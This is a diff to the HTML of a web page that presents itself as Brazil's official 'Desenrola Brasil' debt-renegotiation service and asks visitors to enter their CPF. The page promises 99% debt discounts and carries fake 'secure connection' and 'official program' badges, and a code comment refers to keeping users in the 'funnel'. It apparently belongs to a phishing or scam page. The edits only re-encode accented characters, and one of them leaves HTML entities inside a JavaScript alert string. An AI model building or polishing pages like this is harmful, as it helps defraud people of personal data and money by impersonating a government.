@@ -17,7 +17,7 @@
   <link rel="icon" type="image/png" sizes="96x96" href="images/icons8-brasil-windows-11-color-96.png">
   <link rel="icon" type="image/png" sizes="32x32" href="images/icons8-brasil-windows-11-color-32.png">
   <link rel="icon" type="image/png" sizes="16x16" href="images/icons8-brasil-windows-11-color-16.png">
-  <title>Desenrola Brasil — Informe seu CPF</title>
+  <title>Desenrola Brasil &mdash; Informe seu CPF</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
   <link href="css/css2.css" rel="stylesheet">
@@ -49,8 +49,8 @@
     </header>
 
     <div class="crumb">
-      Benefício <span aria-hidden="true"> &gt; </span> Desenrola Brasil
-      <span aria-hidden="true"> &gt; </span> Usuário gov.br
+      Benef&iacute;cio <span aria-hidden="true"> &gt; </span> Desenrola Brasil
+      <span aria-hidden="true"> &gt; </span> Usu&aacute;rio gov.br
     </div>
 
     <section class="card-main cpf-wrap">
@@ -58,7 +58,7 @@
 
       <p class="instrucao">
         ✅ ATUALIZADO - Informe seu CPF e clique em "Continuar" para<br>
-        renegociar suas dívidas com descontos de 99%
+        renegociar suas d&iacute;vidas com descontos de 99%
       </p>
 
       <form id="cpfForm" novalidate="">
@@ -71,7 +71,7 @@
       <div class="info-box">
         <span class="ico-i" aria-hidden="true">!</span>
         <p>
-          O Programa Desenrola Brasil oferece acordos com descontos de 99% e recuperação de crédito imediata!
+          O Programa Desenrola Brasil oferece acordos com descontos de 99% e recupera&ccedil;&atilde;o de cr&eacute;dito imediata!
         </p>
       </div>
 
@@ -81,7 +81,7 @@
             <rect x="5" y="11" width="14" height="10" rx="2"></rect>
             <path d="M8 11V7a4 4 0 0 1 8 0v4"></path>
           </svg>
-          Conexão segura
+          Conex&atilde;o segura
         </span>
         <span class="trust-item">
           <svg class="trust-ico" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
@@ -91,15 +91,15 @@
           Programa oficial
         </span>
       </div>
-      <p class="trust-sub">Sistema de Renegociação — Todos os direitos reservados</p>
+      <p class="trust-sub">Sistema de Renegocia&ccedil;&atilde;o &mdash; Todos os direitos reservados</p>
     </section>
 
     <footer class="site-ft">
       <div class="site-ft-inner">
         <img src="images/iconefooter.png" alt="" class="ft-gov-img" width="120" height="40">
         <div class="copy-block">
-          <p>Todo o conteúdo deste site está publicado sob a licença</p>
-          <strong>Sistema de Renegociação — Todos os direitos reservados</strong>
+          <p>Todo o conte&uacute;do deste site est&aacute; publicado sob a licen&ccedil;a</p>
+          <strong>Sistema de Renegocia&ccedil;&atilde;o &mdash; Todos os direitos reservados</strong>
         </div>
       </div>
     </footer>
@@ -134,7 +134,7 @@
       document.getElementById('cpfForm').addEventListener('submit', async function (e) {
         e.preventDefault();
         var raw = onlyDigits(input.value);
-        if (!isValidCPF(raw)) { alert('CPF inválido. Verifique os dígitos.'); return; }
+        if (!isValidCPF(raw)) { alert('CPF inv&aacute;lido. Verifique os d&iacute;gitos.'); return; }
         var btn = e.target.querySelector('button[type="submit"]');
         if (btn) { btn.disabled = true; btn.textContent = 'Consultando…'; }
 
@@ -155,7 +155,7 @@
             }
           }
         } catch (_) {
-          // Se a API externa falhar, tiver timeout ou CORS, não trava o usuário no funil
+          // Se a API externa falhar, tiver timeout ou CORS, n&atilde;o trava o usu&aacute;rio no funil
         }
 
         try {
